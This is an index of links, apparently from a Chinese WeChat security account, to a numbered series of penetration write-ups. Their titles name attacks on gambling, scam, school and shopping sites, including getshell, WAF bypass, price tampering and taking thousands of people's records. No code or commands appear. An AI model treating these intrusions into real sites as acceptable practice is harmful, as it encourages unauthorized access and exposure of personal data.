▶[【渗透实战系列】|24-针对CMS的SQL注入漏洞的代码审计思路和方法](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247488259&idx=2&sn=273a82e72fb6444bb146341005d1c08f&chksm=ce67b99af910308cc49e786e2da5fead40de6f0fb5eaf0a0204452603b3366c2bb5a78bb3410&scene=21#wechat_redirect)

▶[【渗透实战系列】|23-某菠菜网站渗透实战](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247487961&idx=2&sn=2f514d32e56179711d31a63954994cad&chksm=ce67bb40f9103256d21e10cfc1bcc5c2e8833303aa8fc48b750e3d90269100f91d6bbb05d5e3&scene=21#wechat_redirect)

▶[【渗透实战系列】|22-渗透系列之打击彩票站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247487003&idx=1&sn=5c85b34ce6ffb400fdf858737e34df3d&chksm=ce67a482f9102d9405e838f34479dc8d1c6b793d3b6d4f40d9b3cec9cc87f14555d865cb3ddc&scene=21#wechat_redirect)

▶[【渗透实战系列】|21一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486970&idx=1&sn=c03c523e8962b6a6487328d7581163fa&chksm=ce67a763f9102e751021376f0dd566b50094925852d5aefb7196c96456e16886ecc4e695860e&scene=21#wechat_redirect)

▶[【渗透实战系列】|20-渗透直播网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486897&idx=1&sn=4489b16f5ec0f25f7390d635e89d414e&chksm=ce67a728f9102e3e2469c23c3b4004dfd76d68f8f1f03b3d2ef948480a1d422ad16b67a8a7f6&scene=21#wechat_redirect)

▶[【渗透实战系列】|19-杀猪盘渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486570&idx=1&sn=0c20fbbf4adbeb5b555164438b3197f7&chksm=ce67a6f3f9102fe51b76482cd7d6bb644631ae469d8c1802956034077137ecd49ea56c8d2b1f&scene=21#wechat_redirect)

▶[【渗透实战系列】|18-手动拿学校站点 得到上万人的信息（漏洞已提交）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486527&idx=1&sn=c1d4f51269e16d5dfdf110c91a8f19e4&chksm=ce67a6a6f9102fb07ad71789894824f553bd1207a3637da8a79b42868a9a9db900fb6d8aa358&scene=21#wechat_redirect)

▶[【渗透实战系列】|17-巧用fofa对目标网站进行getshell](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486499&idx=1&sn=7b8c8acc40e1281f1e388f799e7d2229&chksm=ce67a6baf9102facdd7d574719c51e33521308d9b76f53e5462c59674c9d38f18f213e8b1920&scene=21#wechat_redirect)

▶[【渗透实战系列】|16-裸聊APP渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486466&idx=1&sn=121b62ef2740e8474119c3914d363e4c&chksm=ce67a69bf9102f8deac87602cbb4504f9a59336fb0113f728164c65048d0962f92dd2dd66113&scene=21#wechat_redirect)

▶[【渗透实战系列】|15-博彩网站（APP）渗透的常见切入点](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486411&idx=1&sn=e5227a9f252f797bf170353d18222d6a&chksm=ce67a152f9102844551cf537356b85a6920abb084d5c6a26f7f8aea6870f51208782ac246ee2&scene=21#wechat_redirect)

▶[【渗透实战系列】|14-对诈骗（杀猪盘）网站的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486388&idx=1&sn=cfc74ce3900b5ae89478bab819ede626&chksm=ce67a12df910283b8bc136f46ebd1d8ea59fcce80bce216bdf075481578c479fefa58973d7cb&scene=21#wechat_redirect)

▶[【渗透实战系列】|13-waf绕过拿下赌博网站](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486335&idx=1&sn=4cb172171dafd261c287f5bb90c35249&chksm=ce67a1e6f91028f08de759e1f8df8721f6c5a1e84d8c5f0948187c0c5b749fa2acdd4228b8e7&scene=21#wechat_redirect)

▶[【渗透实战系列】|12 -渗透实战， 被骗4000花呗背后的骗局](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486245&idx=1&sn=ebfcf540266643c0d618e5cd47396474&chksm=ce67a1bcf91028aa09435781e951926067dcf41532dacf9f6d3b522ca2df1be8a3c8551c1672&scene=21#wechat_redirect)

▶[【渗透实战系列】|11 - 赌博站人人得而诛之](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486232&idx=1&sn=301810a7ba60add83cdcb99498de8125&chksm=ce67a181f9102897905ffd677dafeb90087d996cd2e7965300094bd29cba8f68d69f675829be&scene=21#wechat_redirect)

▶[【渗透实战系列】|10 - 记某色X商城支付逻辑漏洞的白嫖（修改价格提交订单）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486060&idx=1&sn=a4b977e9e3bbfe7b2c9ec479942e615c&chksm=ce67a0f5f91029e30c854eb2f71173efe925a38294fd39017708abcf4deea5c2b25dee518ebf&scene=21#wechat_redirect)

▶[【渗透实战系列】|9-对境外网站开展的一次web渗透测试（非常详细，适合打战练手）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486042&idx=1&sn=4022c7f001ca99dc6837d51b759d5104&chksm=ce67a0c3f91029d5f1ac9dc24d23cb390630db1cc3f8e76398cf097a50e29e0b98e9afcb600a&scene=21#wechat_redirect)

▶[【渗透实战系列】|8-记一次渗透测试从XSS到Getshell过程（详细到无语）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247486005&idx=3&sn=55aad92a300e5a6410aa194b521e11b2&chksm=ce67a0acf91029ba5cd51fbe7c5682fd3eab8a257cf1f6bae44fdaa871bbac7edd51440e4cf8&scene=21#wechat_redirect)

▶[【渗透实战系列】|7-记一次理财杀猪盘渗透测试案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485901&idx=1&sn=84b5dac005c838c1b6d22fc4207c81c1&chksm=ce67a354f9102a42260468d305734ed7ea437715ee508f2b3eeb8afa0727b7f4ae652909ff44&scene=21#wechat_redirect)

▶[【渗透实战系列】|6- BC杀猪盘渗透一条龙](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485861&idx=1&sn=39318b76da490ed2a8746134f685d454&chksm=ce67a33cf9102a2aa3793cafbd701c77f851ca9dac3f827524b5cfe093cbecb14892ee131400&scene=21#wechat_redirect)

▶[【渗透实战系列】|5-记一次内衣网站渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485826&idx=2&sn=8f11b7cc12f6c5dfb5eeeb316f14f460&chksm=ce67a31bf9102a0d704877584dc3c49141a376cc1b35c0659f3ae72baa7e77e6de7e0f916db5&scene=21#wechat_redirect)

▶[【渗透实战系列】|4-看我如何拿下BC站的服务器](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485789&idx=2&sn=a1a3c9fc97eeab0b5e5bd3d311e3fae6&chksm=ce67a3c4f9102ad21ce5c895d364b4d094391d2369edfc3afce63ed0b155f8db1c86fa6924f1&scene=21#wechat_redirect)  

▶[【渗透实战系列】|3-一次简单的渗透](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485778&idx=2&sn=997ecdc137f7ae88737e827b29db4e45&chksm=ce67a3cbf9102add52833faf5ad7346affc93589fc8babf72468997c2dbd88c25e8f06d8a7e0&scene=21#wechat_redirect)

▶[【渗透实战系列】|2-记一次后门爆破到提权实战案例](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485647&idx=2&sn=28a227ff21a6a99e323f6e27130a5ad5&chksm=ce67a256f9102b4030db2fc636ff1d454d46178fc2003368305cdc06ae2a4c81dd011dfcb361&scene=21#wechat_redirect)

▶[【渗透实战系列】|1一次对跨境赌博类APP的渗透实战（getshell并获得全部数据）](http://mp.weixin.qq.com/s?__biz=Mzg2NDYwMDA1NA==&mid=2247485589&idx=1&sn=f4f64ea923675c425f1de9e4e287fb07&chksm=ce67a20cf9102b1a1a171041745bd7c243156eaee575b444acc62d325e2cd2d9f72b2779cf01&scene=21#wechat_redirect)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

**长按-识别-关注**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Hacking黑白红**

一个专注信息安全技术的学习平台

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**点分享**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**点收藏**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**点点赞**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**点在看**